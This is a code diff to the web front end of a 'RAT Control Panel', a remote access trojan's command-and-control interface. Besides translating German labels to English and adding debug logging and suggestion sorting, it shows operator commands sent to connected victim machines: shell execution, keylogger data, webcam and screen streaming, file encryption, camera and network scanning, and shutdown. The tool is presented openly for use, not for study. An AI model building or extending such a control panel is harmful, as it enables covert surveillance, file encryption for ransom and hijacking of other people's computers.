@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <link rel="icon" type="image/x-icon" href="favicon.ico" />
@@ -102,6 +102,13 @@
       z-index: 1000;
     }
     
+    .notifications-container {
+      position: fixed;
+      top: 80px;
+      right: 20px;
+      z-index: 999;
+    }
+    
     .scrollbar-thin {
       scrollbar-width: thin;
       scrollbar-color: rgba(156, 163, 175, 0.5) transparent;
@@ -125,7 +132,7 @@
   <!-- Connection Status Indicator -->
   <div id="connection-indicator" class="connection-indicator">
     <div id="connection-status" class="px-3 py-2 rounded-full text-sm font-medium bg-yellow-500 text-yellow-900">
-      <i class="fas fa-wifi mr-2"></i>Verbinde...
+      <i class="fas fa-wifi mr-2"></i>Connecting...
     </div>
   </div>
 
@@ -135,18 +142,18 @@
       <div class="text-center mb-6">
         <i class="fas fa-shield-alt text-4xl text-blue-400 mb-4"></i>
         <h1 class="text-3xl font-bold text-white mb-2">RAT Control Panel</h1>
-        <p class="text-gray-300">Sicherer Zugang erforderlich</p>
+        <p class="text-gray-300">Secure access required</p>
       </div>
       
       <form id="login-form" class="space-y-4">
         <div>
-          <label class="block text-sm font-medium text-gray-300 mb-2">Benutzername</label>
+          <label class="block text-sm font-medium text-gray-300 mb-2">Username</label>
           <input type="text" id="login-username" required
                  class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
         </div>
         
         <div>
-          <label class="block text-sm font-medium text-gray-300 mb-2">Passwort</label>
+          <label class="block text-sm font-medium text-gray-300 mb-2">Password</label>
           <input type="password" id="login-password" required
                  class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
         </div>
@@ -154,7 +161,7 @@
         <div id="login-error" class="text-red-400 text-sm hidden"></div>
         
         <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-lg transition duration-200">
-          <i class="fas fa-sign-in-alt mr-2"></i>Anmelden
+          <i class="fas fa-sign-in-alt mr-2"></i>Login
         </button>
       </form>
     </div>
@@ -167,17 +174,17 @@
       <div class="mb-6">
         <h2 class="text-xl font-bold text-white mb-4 flex items-center">
           <i class="fas fa-desktop mr-3 text-blue-400"></i>
-          Verbundene Clients
+          Connected Clients
           <span id="client-count" class="ml-auto bg-blue-600 text-white text-xs px-2 py-1 rounded-full">0</span>
         </h2>
         
         <!-- Client Actions -->
         <div class="flex gap-2 mb-4">
           <button id="refresh-clients" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg transition duration-200 text-sm">
-            <i class="fas fa-sync-alt mr-2"></i>Aktualisieren
+            <i class="fas fa-sync-alt mr-2"></i>Refresh
           </button>
           <button id="select-all-clients" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded-lg transition duration-200 text-sm">
-            <i class="fas fa-check-double mr-2"></i>Alle
+            <i class="fas fa-check-double mr-2"></i>All
           </button>
         </div>
       </div>
@@ -186,8 +193,8 @@
       <div id="client-list" class="space-y-3">
         <div class="text-center text-gray-400 py-8">
           <i class="fas fa-satellite-dish text-3xl mb-3"></i>
-          <p>Keine Clients verbunden</p>
-          <p class="text-sm">Warte auf Verbindungen...</p>
+          <p>No clients connected</p>
+          <p class="text-sm">Waiting for connections...</p>
         </div>
       </div>
     </div>
@@ -198,15 +205,15 @@
       <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700">
         <div class="flex items-center justify-between">
           <div>
-            <h1 class="text-2xl font-bold text-white">Advanced RAT Control Panel</h1>
-            <p class="text-gray-300 text-sm">Ausgewählte Clients: <span id="selected-count">0</span></p>
+            <h1 class="text-2xl font-bold text-white">RAT Control Panel</h1>
+            <p class="text-gray-300 text-sm">Selected Clients: <span id="selected-count">0</span></p>
           </div>
           <div class="flex items-center gap-4">
             <button id="server-stats-btn" class="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-lg transition duration-200">
               <i class="fas fa-chart-bar mr-2"></i>Server Stats
             </button>
             <button id="clear-output" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition duration-200">
-              <i class="fas fa-trash mr-2"></i>Leeren
+              <i class="fas fa-trash mr-2"></i>Clear
             </button>
             <button id="export-logs" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg transition duration-200">
               <i class="fas fa-download mr-2"></i>Export
@@ -219,7 +226,7 @@
       <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700">
         <div class="flex gap-3 relative">
           <div class="flex-1 relative">
-            <input type="text" id="command-input" placeholder="Gib einen Befehl ein... (/ für Vorschläge)"
+            <input type="text" id="command-input" placeholder="Enter command... (/ for suggestions)"
                    class="command-input w-full px-4 py-3 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
             
             <!-- Command Suggestions -->
@@ -229,7 +236,7 @@
           </div>
           
           <button id="send-command" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-medium transition duration-200">
-            <i class="fas fa-paper-plane mr-2"></i>Senden
+            <i class="fas fa-paper-plane mr-2"></i>Send
           </button>
           
           <input type="file" id="file-upload" class="hidden" multiple>
@@ -247,13 +254,13 @@
             <i class="fas fa-camera mr-1"></i>Screenshot
           </button>
           <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/ls">
-            <i class="fas fa-folder mr-1"></i>Liste Dateien
+            <i class="fas fa-folder mr-1"></i>List Files
           </button>
           <button class="quick-action bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/process_list">
-            <i class="fas fa-tasks mr-1"></i>Prozesse
+            <i class="fas fa-tasks mr-1"></i>Processes
           </button>
           <button class="quick-action bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/network_info">
-            <i class="fas fa-network-wired mr-1"></i>Netzwerk
+            <i class="fas fa-network-wired mr-1"></i>Network
           </button>
           <button class="quick-action bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/screenstream_start">
             <i class="fas fa-desktop mr-1"></i>Screen Stream
@@ -272,17 +279,17 @@
         <!-- Output Area -->
         <div class="flex-1 flex flex-col p-4">
           <div class="flex items-center justify-between mb-3">
-            <h3 class="text-lg font-semibold text-white">Ausgabe</h3>
+            <h3 class="text-lg font-semibold text-white">Output</h3>
             <button id="copy-output" class="bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg text-sm transition duration-200">
-              <i class="fas fa-copy mr-2"></i>Kopieren
+              <i class="fas fa-copy mr-2"></i>Copy
             </button>
           </div>
           
           <div id="output-area" class="output-area flex-1 p-4 rounded-lg overflow-y-auto scrollbar-thin text-sm leading-relaxed">
             <div class="text-gray-400 text-center py-8">
               <i class="fas fa-terminal text-3xl mb-3"></i>
-              <p>Bereit für Befehle...</p>
-              <p class="text-xs mt-2">Verwende / für Befehlsvorschläge</p>
+              <p>Ready for commands...</p>
+              <p class="text-xs mt-2">Use / for command suggestions</p>
             </div>
           </div>
         </div>
@@ -330,8 +337,8 @@
             <!-- Placeholder when no media -->
             <div id="media-placeholder" class="text-center text-gray-400 py-8">
               <i class="fas fa-image text-3xl mb-3"></i>
-              <p>Keine Live-Medien</p>
-              <p class="text-xs">Screenshots und Streams erscheinen hier</p>
+              <p>No live media</p>
+              <p class="text-xs">Screenshots and streams appear here</p>
             </div>
           </div>
         </div>
@@ -343,7 +350,7 @@
   <div id="server-stats-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
     <div class="glass-effect rounded-2xl p-6 w-full max-w-4xl mx-4 max-h-[90vh] overflow-y-auto">
       <div class="flex items-center justify-between mb-6">
-        <h2 class="text-2xl font-bold text-white">Server Statistiken</h2>
+        <h2 class="text-2xl font-bold text-white">Server Statistics</h2>
         <button id="close-stats-modal" class="text-gray-400 hover:text-white text-2xl">
           <i class="fas fa-times"></i>
         </button>
@@ -355,14 +362,14 @@
       
       <div class="mt-6 text-center">
         <button id="refresh-stats" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg transition duration-200">
-          <i class="fas fa-sync-alt mr-2"></i>Aktualisieren
+          <i class="fas fa-sync-alt mr-2"></i>Refresh
         </button>
       </div>
     </div>
   </div>
 
   <!-- Notifications Container -->
-  <div id="notifications" class="fixed top-4 right-4 z-50 space-y-2"></div>
+  <div id="notifications" class="notifications-container space-y-2"></div>
 
   <script>
     // Global Variables
@@ -376,29 +383,29 @@
 
     // Command suggestions
     const commands = [
-      { cmd: '/help', desc: 'Zeigt verfügbare Befehle an' },
-      { cmd: '/exec', desc: 'Führt einen Shell-Befehl aus' },
-      { cmd: '/screenshot', desc: 'Macht einen Screenshot' },
-      { cmd: '/download', desc: 'Lädt eine Datei herunter' },
-      { cmd: '/upload', desc: 'Lädt eine Datei hoch' },
-      { cmd: '/ls', desc: 'Listet Verzeichnisinhalt auf' },
-      { cmd: '/cd', desc: 'Wechselt das Verzeichnis' },
-      { cmd: '/systeminfo', desc: 'Zeigt Systeminformationen' },
-      { cmd: '/history', desc: 'Zeigt Browser-Verlauf' },
-      { cmd: '/keylogger', desc: 'Zeigt Keylogger-Daten' },
-      { cmd: '/screenstream_start', desc: 'Startet Screen-Streaming' },
-      { cmd: '/screenstream_stop', desc: 'Stoppt Screen-Streaming' },
-      { cmd: '/webcam_start', desc: 'Startet Webcam-Stream' },
-      { cmd: '/webcam_stop', desc: 'Stoppt Webcam-Stream' },
-      { cmd: '/encrypt', desc: 'Verschlüsselt Dateien/Ordner' },
-      { cmd: '/decrypt', desc: 'Entschlüsselt Dateien/Ordner' },
-      { cmd: '/scan_cameras', desc: 'Scannt nach Netzwerk-Kameras' },
-      { cmd: '/process_list', desc: 'Zeigt laufende Prozesse' },
-      { cmd: '/kill_process', desc: 'Beendet einen Prozess (PID)' },
-      { cmd: '/network_info', desc: 'Zeigt Netzwerk-Informationen' },
-      { cmd: '/network_scan', desc: 'Scannt Netzwerk nach Hosts' },
-      { cmd: '/shutdown', desc: 'Fährt das System herunter' },
-      { cmd: '/restart', desc: 'Startet das System neu' }
+      { cmd: '/help', desc: 'Show available commands' },
+      { cmd: '/exec', desc: 'Execute shell command' },
+      { cmd: '/screenshot', desc: 'Take screenshot' },
+      { cmd: '/download', desc: 'Download file' },
+      { cmd: '/upload', desc: 'Upload file' },
+      { cmd: '/ls', desc: 'List directory contents' },
+      { cmd: '/cd', desc: 'Change directory' },
+      { cmd: '/systeminfo', desc: 'Show system information' },
+      { cmd: '/history', desc: 'Show browser history' },
+      { cmd: '/keylogger', desc: 'Show keylogger data' },
+      { cmd: '/screenstream_start', desc: 'Start screen streaming' },
+      { cmd: '/screenstream_stop', desc: 'Stop screen streaming' },
+      { cmd: '/webcam_start', desc: 'Start webcam stream' },
+      { cmd: '/webcam_stop', desc: 'Stop webcam stream' },
+      { cmd: '/encrypt', desc: 'Encrypt files/folders' },
+      { cmd: '/decrypt', desc: 'Decrypt files/folders' },
+      { cmd: '/scan_cameras', desc: 'Scan for network cameras' },
+      { cmd: '/process_list', desc: 'Show running processes' },
+      { cmd: '/kill_process', desc: 'Kill process by PID' },
+      { cmd: '/network_info', desc: 'Show network information' },
+      { cmd: '/network_scan', desc: 'Scan network for hosts' },
+      { cmd: '/shutdown', desc: 'Shutdown system' },
+      { cmd: '/restart', desc: 'Restart system' }
     ];
 
     // DOM Elements
@@ -465,19 +472,19 @@
       switch (status) {
         case 'connected':
           statusElement.className += ' bg-green-500 text-green-900';
-          statusElement.innerHTML = '<i class="fas fa-check-circle mr-2"></i>Verbunden';
+          statusElement.innerHTML = '<i class="fas fa-check-circle mr-2"></i>Connected';
           break;
         case 'connecting':
           statusElement.className += ' bg-yellow-500 text-yellow-900';
-          statusElement.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verbinde...';
+          statusElement.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Connecting...';
           break;
         case 'disconnected':
           statusElement.className += ' bg-red-500 text-red-900';
-          statusElement.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Getrennt';
+          statusElement.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Disconnected';
           break;
         case 'error':
           statusElement.className += ' bg-red-600 text-red-100';
-          statusElement.innerHTML = '<i class="fas fa-times-circle mr-2"></i>Fehler';
+          statusElement.innerHTML = '<i class="fas fa-times-circle mr-2"></i>Error';
           break;
       }
     }
@@ -525,7 +532,7 @@
           loginOverlay.classList.add('hidden');
           mainApp.classList.remove('hidden');
           connectWebSocket();
-          showNotification('Erfolgreich angemeldet!', 'success');
+          showNotification('Successfully logged in!', 'success');
           return true;
         } else {
           throw new Error(data.error || 'Login fehlgeschlagen');
@@ -554,9 +561,14 @@
       
       ws.onopen = function() {
         updateConnectionStatus('connected');
-        showNotification('WebSocket Verbindung hergestellt', 'success');
+        showNotification('WebSocket connection established', 'success');
         reconnectAttempts = 0;
+        
+        // Request client list immediately
         requestClientList();
+        
+        // Debug: Log that we're requesting client list
+        console.log('WebSocket opened, requesting client list...');
       };
       
       ws.onmessage = function(event) {
@@ -604,18 +616,21 @@
     }
 
     function handleWebSocketMessage(data) {
+      console.log('Received WebSocket message:', data); // Debug log
+      
       switch (data.type) {
         case 'client_list':
+          console.log('Updating client list with clients:', data.clients); // Debug log
           updateClientList(data.clients || []);
           break;
           
         case 'client_connected':
-          showNotification(`Neuer Client verbunden: ${data.client.hostname}`, 'success');
+          showNotification(`New client connected: ${data.client.hostname}`, 'success');
           requestClientList(); // Auto-refresh client list
           break;
           
         case 'client_disconnected':
-          showNotification(`Client getrennt: ${data.client_id}`, 'warning');
+          showNotification(`Client disconnected: ${data.client_id}`, 'warning');
           selectedClients.delete(data.client_id);
           updateSelectedCount();
           requestClientList(); // Auto-refresh client list
@@ -696,8 +711,8 @@
         clientList.innerHTML = `
           <div class="text-center text-gray-400 py-8">
             <i class="fas fa-satellite-dish text-3xl mb-3"></i>
-            <p>Keine Clients verbunden</p>
-            <p class="text-sm">Warte auf Verbindungen...</p>
+            <p>No clients connected</p>
+            <p class="text-sm">Waiting for connections...</p>
           </div>
         `;
         return;
@@ -811,7 +826,10 @@
 
     function requestClientList() {
       if (ws && ws.readyState === WebSocket.OPEN) {
+        console.log('Requesting client list...'); // Debug log
         ws.send(JSON.stringify({ action: 'get_clients' }));
+      } else {
+        console.log('WebSocket not ready, state:', ws ? ws.readyState : 'no websocket'); // Debug log
       }
     }
 
@@ -862,24 +880,68 @@
         return;
       }
       
+      // Enhanced filtering with categories - inspired by CommandInput.tsx
       const filtered = commands.filter(cmd => 
         cmd.cmd.toLowerCase().includes(value) || 
         cmd.desc.toLowerCase().includes(value)
-      );
+      ).sort((a, b) => {
+        // Prioritize exact matches
+        const aExact = a.cmd.toLowerCase().startsWith(value);
+        const bExact = b.cmd.toLowerCase().startsWith(value);
+        if (aExact && !bExact) return -1;
+        if (!aExact && bExact) return 1;
+        return a.cmd.localeCompare(b.cmd);
+      });
       
       if (filtered.length === 0) {
         hideCommandSuggestions();
         return;
       }
       
+      // Category colors mapping (like in CommandInput.tsx)
+      const getCategoryColor = (cmdName) => {
+        const categoryMap = {
+          '/help': '#6b7280', '/exec': '#ef4444', '/screenshot': '#8b5cf6',
+          '/download': '#10b981', '/upload': '#10b981', '/ls': '#10b981', '/cd': '#10b981',
+          '/systeminfo': '#3b82f6', '/history': '#3b82f6', '/keylogger': '#f59e0b',
+          '/encrypt': '#f97316', '/decrypt': '#f97316', '/process_list': '#ef4444',
+          '/kill_process': '#ef4444', '/network_info': '#06b6d4', '/network_scan': '#06b6d4',
+          '/scan_cameras': '#06b6d4', '/screenstream_start': '#8b5cf6', '/screenstream_stop': '#8b5cf6',
+          '/webcam_start': '#8b5cf6', '/webcam_stop': '#8b5cf6',
+          '/shutdown': '#dc2626', '/restart': '#dc2626'
+        };
+        return categoryMap[cmdName] || '#6b7280';
+      };
+      
       commandSuggestions.innerHTML = '';
-      filtered.forEach(cmd => {
+      filtered.forEach((cmd, index) => {
         const div = document.createElement('div');
-        div.className = 'suggestion-item px-4 py-2 cursor-pointer';
+        div.className = 'suggestion-item px-4 py-2 cursor-pointer flex items-center';
+        
+        // Enhanced suggestion with category indicator (inspired by CommandInput.tsx)
         div.innerHTML = `
-          <div class="flex justify-between items-center">
-            <span class="font-medium text-blue-400">${cmd.cmd}</span>
-            <span class="text-sm text-gray-400">${cmd.desc}</span>
+          <div style="display: flex; align-items: center; flex: 1;">
+            <span style="
+              background-color: ${getCategoryColor(cmd.cmd)};
+              color: white;
+              font-size: 0.7em;
+              padding: 2px 6px;
+              border-radius: 3px;
+              margin-right: 8px;
+              text-transform: uppercase;
+              font-weight: bold;
+            ">
+              ${cmd.cmd.includes('process') ? 'SYS' : 
+                cmd.cmd.includes('network') || cmd.cmd.includes('scan') ? 'NET' :
+                cmd.cmd.includes('stream') || cmd.cmd.includes('webcam') || cmd.cmd.includes('screenshot') ? 'MED' :
+                cmd.cmd.includes('download') || cmd.cmd.includes('upload') || cmd.cmd.includes('ls') || cmd.cmd.includes('cd') ? 'FILE' :
+                cmd.cmd.includes('encrypt') || cmd.cmd.includes('decrypt') ? 'SEC' :
+                cmd.cmd.includes('shutdown') || cmd.cmd.includes('restart') ? 'PWR' :
+                cmd.cmd.includes('keylogger') ? 'SPY' :
+                cmd.cmd.includes('info') || cmd.cmd.includes('history') ? 'INFO' : 'GEN'}
+            </span>
+            <span class="font-medium text-blue-400" style="min-width: 110px;">${cmd.cmd}</span>
+            <span class="text-sm text-gray-400" style="margin-left: 10px;">${cmd.desc}</span>
           </div>
         `;
         
@@ -926,7 +988,7 @@
     function sendCommandToClients() {
       const command = commandInput.value.trim();
       if (!command || selectedClients.size === 0) {
-        showNotification('Bitte wähle einen Client aus und gib einen Befehl ein', 'warning');
+        showNotification('Please select a client and enter a command', 'warning');
         return;
       }
       
@@ -953,7 +1015,7 @@
         }
       });
       
-      logOutput(`Befehl gesendet an ${selectedClients.size} Client(s): ${command}`, 'command');
+      logOutput(`Command sent to ${selectedClients.size} client(s): ${command}`, 'command');
       commandInput.value = '';
       hideCommandSuggestions();
     }
@@ -1027,7 +1089,7 @@
           throw new Error('Failed to load stats');
         }
       } catch (error) {
-        showNotification('Fehler beim Laden der Server-Statistiken', 'error');
+        showNotification('Error loading server statistics', 'error');
         console.error('Stats error:', error);
       }
     }
@@ -1054,14 +1116,14 @@
       };
 
       serverStatsContent.innerHTML = `
-        ${createStatCard('Verbundene Clients', stats.connected_clients || 0, 'fas fa-desktop', 'bg-blue-700')}
-        ${createStatCard('Web UI Verbindungen', stats.web_ui_connections || 0, 'fas fa-globe', 'bg-green-700')}
-        ${createStatCard('Gesperrte IPs', stats.banned_ips || 0, 'fas fa-ban', 'bg-red-700')}
-        ${createStatCard('CPU Auslastung', `${stats.cpu_percent || 0}%`, 'fas fa-microchip')}
-        ${createStatCard('RAM Auslastung', `${stats.memory_percent || 0}%`, 'fas fa-memory')}
-        ${createStatCard('Festplatte', `${stats.disk_percent || 0}%`, 'fas fa-hdd')}
-        ${createStatCard('RAM Nutzung', `${stats.memory_used_gb || 0} / ${stats.memory_total_gb || 0} GB`, 'fas fa-memory')}
-        ${createStatCard('Festplatte Nutzung', `${stats.disk_used_gb || 0} / ${stats.disk_total_gb || 0} GB`, 'fas fa-hdd')}
+        ${createStatCard('Connected Clients', stats.connected_clients || 0, 'fas fa-desktop', 'bg-blue-700')}
+        ${createStatCard('Web UI Connections', stats.web_ui_connections || 0, 'fas fa-globe', 'bg-green-700')}
+        ${createStatCard('Banned IPs', stats.banned_ips || 0, 'fas fa-ban', 'bg-red-700')}
+        ${createStatCard('CPU Usage', `${stats.cpu_percent || 0}%`, 'fas fa-microchip')}
+        ${createStatCard('RAM Usage', `${stats.memory_percent || 0}%`, 'fas fa-memory')}
+        ${createStatCard('Disk Usage', `${stats.disk_percent || 0}%`, 'fas fa-hdd')}
+        ${createStatCard('RAM', `${stats.memory_used_gb || 0} / ${stats.memory_total_gb || 0} GB`, 'fas fa-memory')}
+        ${createStatCard('Disk Space', `${stats.disk_used_gb || 0} / ${stats.disk_total_gb || 0} GB`, 'fas fa-hdd')}
         ${createStatCard('Server Uptime', formatUptime(stats.uptime || 0), 'fas fa-clock', 'bg-purple-700')}
       `;
     }
@@ -1072,7 +1134,7 @@
       screenshotContainer.classList.remove('hidden');
       mediaPlaceholder.classList.add('hidden');
       
-      showNotification('Screenshot empfangen', 'success');
+      showNotification('Screenshot received', 'success');
     }
 
     function displayScreenFrame(data) {
@@ -1193,8 +1255,8 @@
         outputArea.innerHTML = `
           <div class="text-gray-400 text-center py-8">
             <i class="fas fa-terminal text-3xl mb-3"></i>
-            <p>Bereit für Befehle...</p>
-            <p class="text-xs mt-2">Verwende / für Befehlsvorschläge</p>
+            <p>Ready for commands...</p>
+            <p class="text-xs mt-2">Use / for command suggestions</p>
           </div>
         `;
       });
@@ -1202,7 +1264,7 @@
       document.getElementById('copy-output').addEventListener('click', () => {
         const text = outputArea.innerText;
         navigator.clipboard.writeText(text).then(() => {
-          showNotification('Ausgabe in Zwischenablage kopiert', 'success');
+          showNotification('Output copied to clipboard', 'success');
         });
       });
       
@@ -1215,7 +1277,7 @@
         a.download = `rat-logs-${new Date().toISOString().slice(0, 19)}.txt`;
         a.click();
         URL.revokeObjectURL(url);
-        showNotification('Logs exportiert', 'success');
+        showNotification('Logs exported', 'success');
       });
 
       // Server stats modal
